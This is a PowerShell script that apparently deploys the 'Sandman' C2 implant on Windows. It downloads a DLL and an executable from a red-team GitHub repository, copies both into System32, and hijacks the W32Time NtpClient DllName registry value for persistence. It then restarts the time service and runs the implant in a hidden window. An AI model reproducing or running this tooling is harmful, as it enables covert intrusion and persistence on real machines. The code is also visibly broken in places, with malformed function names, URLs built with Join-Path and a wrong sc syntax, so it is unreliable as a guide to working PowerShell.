<#
.SYNOPSIS
    Sandman v2.0 - Auto Deploy & Run Script
.DESCRIPTION
    Downloads binaries from GitHub, moves to System32, registers DLL,
    restarts W32Time, and runs Sandman.exe
.NOTES
    Author: Sandman Team
    Version: 2.0.0
    Platform: Windows (PowerShell 5.1+)
#>

param(
    [Parameter(Mandatory = $false)]
    [string]$GitHubRepo = "https://github.com/ThePyroArsonist/RedTeamTools/tree/main/sandman/TimeProvider",

    [Parameter(Mandatory = $false)]
    [string]$TargetSystem32Path = "C:\Windows\system32",

    [Parameter(Mandatory = $false)]
    [string]$C2ServerIP = "10.10.10.50",

    [Parameter(Mandatory = $false)]
    [switch]$Verbose,

    [Parameter(Mandatory = $false)]
    [switch]$Quiet
)

function :Log{
    param($Message, $Level = "INFO")
    
    if ($Verbose -or $Level -ne "INFO") {
        $Timestamp = Get-Date -Format "HH:mm:ss"
        if ($Quiet) {
            Write-Host "[$Timestamp] $Level: $Message" -ForegroundColor Gray
        } else {
            $Color = if ($Level -eq "INFO") { "[INFO]" -f "Cyan" } `
                    elseif ($Level -eq "WARN") { "[WARN]" -f "Yellow" } `
                    elseif ($Level -eq "ERROR") { "[ERROR]" -f "Red" } `
                    elseif ($Level -eq "OK") { "[OK]" -f "Green" } `
                    else { "[DEBUG]" -f "Magenta" }
            Write-Host "[$Timestamp] $Color $Message"
        }
    }
}

function :Check-Admin{
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) {
        Log "Script requires Administrator privileges" -Level "ERROR"
        Write-Host "Please run PowerShell as Administrator"
        return $false
    }
    return $true
}

function :Download-Binaries{
    param($GithubRepo, $OutputPath)
    
    $TimeProviderUrl = Join-Path $GithubRepo "TimeProvider.dll"
    $SandmanUrl = Join-Path $GithubRepo "Sandman.exe"
    
    $TimeProviderPath = Join-Path $OutputPath "TimeProvider.dll"
    $SandmanPath = Join-Path $OutputPath "Sandman.exe"
    
    # Create output folder
    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Force -Path $OutputPath | Log
    }
    
    # Download TimeProvider.dll
    Log "Downloading TimeProvider.dll..."
    try {
        Invoke-WebRequest -Uri $TimeProviderUrl -OutFile $TimeProviderPath -TimeoutSec 60
        Log "Downloaded: $TimeProviderPath"
    } catch {
        Log "Download failed: $_" -Level "WARN"
    }
    
    # Download Sandman.exe
    Log "Downloading Sandman.exe..."
    try {
        Invoke-WebRequest -Uri $SandmanUrl -OutFile $SandmanPath -TimeoutSec 60
        Log "Downloaded: $SandmanPath"
    } catch {
        Log "Download failed: $_" -Level "WARN"
    }
    
    return $true
}

function :Move-To-System32{
    param($SourcePath, $DestinationPath, $FileName)
    
    $Destination = Join-Path $DestinationPath $FileName
    if (Test-Path $Destination) {
        Log "Backup: $Destination"
        $BackupPath = Join-Path $DestinationPath "$FileName.bak"
        Rename-Item -Path $Destination -NewName $BackupPath -Force
    }
    
    Move-Item -Path $SourcePath -Destination $Destination -Force
    Log "Moved: $FileName to $Destination"
}

function :Register-Dll{
    param($DllPath, $RegistryPath)
    
    # 1. Backup existing DllName
    $RegistryPath = Join-Path $RegistryPath "DllName"
    $BackupValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
    if ($BackupValue) {
        Log "Backup: $RegistryPath = $($BackupValue.DllName)"
    }
    
    # 2. Set new DllName
    Log "Setting DllName to: $DllPath"
    try {
        $null = reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" `
                      /v DllName /t REG_SZ /d "$DllPath" /f
        Log "Registry updated successfully"
    } catch {
        Log "Registry error: $_" -Level "ERROR"
    }
    
    # 3. Verify registry change
    $NewValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
    if ($NewValue -and $NewValue.DllName -eq $DllPath) {
        Log "Registry verified successfully" -Level "OK"
    } else {
        Log "Registry verification failed" -Level "WARN"
    }
}

function :Restart-W32TimeService{
    param($ServiceName, $RestartCommand)
    
    Log "Restarting $ServiceName service..."
    try {
        $null = & sc stop $ServiceName -Timeout 30
        Log "Service stopped"
        
        $null = & sc start $ServiceName
        Log "Service started"
        
        $Service = Get-Service -Name $ServiceName
        if ($Service.Status -eq "Running") {
            Log "Service is now running" -Level "OK"
            return $true
        } else {
            Log "Service status: $($Service.Status)" -Level "WARN"
            return $true
        }
    } catch {
        Log "Service restart error: $_" -Level "ERROR"
        return $false
    }
}

function :Run-Sandman{
    param($Executable, $Args)
    
    try {
        Log "Starting $Executable..."
        
        # Create hidden process for stealth
        $Process = Start-Process -FilePath $Executable `
                                -ArgumentList $Args `
                                -WindowStyle Hidden `
                                -PassThru
        
        $ProcessId = $Process.Id
        Log "Started: $Executable (PID: $ProcessId)"
        
        # Wait 5 seconds for initial response
        Start-Sleep -Seconds 5
        
        # Check if process is still running
        $Process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
        if ($Process -and $Process.MainModule) {
            Log "Process is running: $($Process.MainModule.FileName)" -Level "OK"
        } else {
            Log "Process may have exited" -Level "WARN"
        }
    } catch {
        Log "Process start error: $_" -Level "ERROR"
    }
}

function :Print-Banner{
    Write-Host @"
   _____                 _                       
  / ____|               | |                      
 | (___   __ _ _ __   __| |_ __ ___   __ _ _ __  
  \___ \ / _` | '_ \ / _` | '_ ` _ \ / _` | '_ \ 
  ____) | (_| | | | | (_| | | | | | | (_| | | | |
 |_____/ \__,_|_| |_|\__,_|_| |_| |_|\__,_|_| |_|
        Sandman C2 Auto Deploy
"@
    Write-Host "        ============================="
}

function :Print-Usage{
    Write-Host @"
Usage: .\Deploy-Sandman.ps1 [-Verbose] [-Quiet]

Examples:
  .\Deploy-Sandman.ps1                  # Default settings
  .\Deploy-Sandman.ps1 -Verbose         # Verbose logging
  .\Deploy-Sandman.ps1 -Quiet           # Silent mode
  .\Deploy-Sandman.ps1 -C2ServerIP 10.10.10.1  # Custom IP
"@
}

# === MAIN SCRIPT (Continued) ===
Log "Starting Sandman Auto Deploy v2.0..."

# Check Admin
if (-not (Check-Admin)) {
    exit 1
}

Print-Banner

# Step 1: Download Binaries
Log "Step 1: Downloading Binaries..."
$TimeProviderPath = Join-Path (Split-Path $GithubRepo) "TimeProvider.dll"
$SandmanPath = Join-Path (Split-Path $GithubRepo) "Sandman.exe"

$Downloaded = $false
if (Test-Path $TimeProviderPath) {
    $Downloaded = $true
    Log "TimeProvider.dll exists: $TimeProviderPath"
} else {
    Log "TimeProvider.dll not found, downloading from GitHub..."
    $GithubUrl = Join-Path $GithubRepo "TimeProvider.dll"
    $TempPath = Join-Path $env:TEMP "Temp_TimeProvider.dll"
    Invoke-WebRequest -Uri $GithubUrl -OutFile $TempPath -TimeoutSec 60
    Move-Item -Path $TempPath -Destination $TimeProviderPath -Force
    Log "Downloaded and moved to: $TimeProviderPath"
}

if (Test-Path $SandmanPath) {
    $Downloaded = $true
    Log "Sandman.exe exists: $SandmanPath"
} else {
    Log "Sandman.exe not found, downloading from GitHub..."
    $GithubUrl = Join-Path $GithubRepo "Sandman.exe"
    $TempPath = Join-Path $env:TEMP "Temp_Sandman.exe"
    Invoke-WebRequest -Uri $GithubUrl -OutFile $TempPath -TimeoutSec 60
    Move-Item -Path $TempPath -Destination $SandmanPath -Force
    Log "Downloaded and moved to: $SandmanPath"
}

if (-not $Downloaded) {
    Log "Binaries download failed!" -Level "ERROR"
    exit 1
}

# Step 2: Move to System32
Log "Step 2: Moving to System32..."
:Move-To-System32 $TimeProviderPath $TargetSystem32Path "TimeProvider.dll"
:Move-To-System32 $SandmanPath $TargetSystem32Path "Sandman.exe"

# Step 3: Register DLL
Log "Step 3: Registering DLL in W32Time..."
$RegistryPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient"
$RegistryPath = Join-Path $RegistryPath "DllName"

# Backup existing DllName
$BackupValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
if ($BackupValue) {
    Log "Backup: RegistryPath = $($BackupValue.DllName)"
}

# Set new DllName
Log "Setting DllName to: $TimeProviderPath"
try {
    $null = reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" `
                  /v DllName /t REG_SZ /d "$TimeProviderPath" /f
    Log "Registry updated successfully"
} catch {
    Log "Registry error: $_" -Level "ERROR"
    exit 1
}

# Verify registry change
$NewValue = Get-ItemProperty -Path $RegistryPath -Name "DllName" -ErrorAction SilentlyContinue
if ($NewValue -and $NewValue.DllName -eq $TimeProviderPath) {
    Log "Registry verified successfully" -Level "OK"
} else {
    Log "Registry verification failed" -Level "WARN"
}

# Step 4: Restart W32Time Service
Log "Step 4: Restarting W32Time Service..."
$null = & sc stop "w32time" -Timeout 30
Log "Service stopped"

$null = & sc start "w32time"
Log "Service started"

$Service = Get-Service -Name "w32time"
if ($Service.Status -eq "Running") {
    Log "Service is now running" -Level "OK"
} else {
    Log "Service status: $($Service.Status)" -Level "WARN"
}

# Step 5: Run Sandman.exe
Log "Step 5: Running Sandman.exe..."
$SandmanExecutable = Join-Path $TargetSystem32Path "Sandman.exe"

if (Test-Path $SandmanExecutable) {
    $Args = "--quiet"
    if ($Verbose) {
        $Args = " -v"
    }
    if ($Quiet) {
        $Args = " -q"
    }
    
    $Process = Start-Process -FilePath $SandmanExecutable `
                            -ArgumentList $Args `
                            -WindowStyle Hidden `
                            -PassThru
    
    $ProcessId = $Process.Id
    Log "Started: Sandman.exe (PID: $ProcessId)"
    
    # Wait 5 seconds for initial response
    Start-Sleep -Seconds 5
    
    # Check if process is still running
    $Process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
    if ($Process -and $Process.MainModule) {
        Log "Process is running: $($Process.MainModule.FileName)" -Level "OK"
    } else {
        Log "Process may have exited" -Level "WARN"
    }
} else {
    Log "Sandman.exe not found at: $SandmanExecutable" -Level "ERROR"
}

# Step 6: Print Summary
Log "Step 6: Deployment Summary..."
Write-Host @"
   Deployment Complete!

   Registry Path: $RegistryPath
   DllName: $NewValue.DllName
   Service: w32time ($($Service.Status))
   Process: Sandman.exe (PID: $ProcessId)

"@

Log "Deployment finished successfully!" -Level "OK"
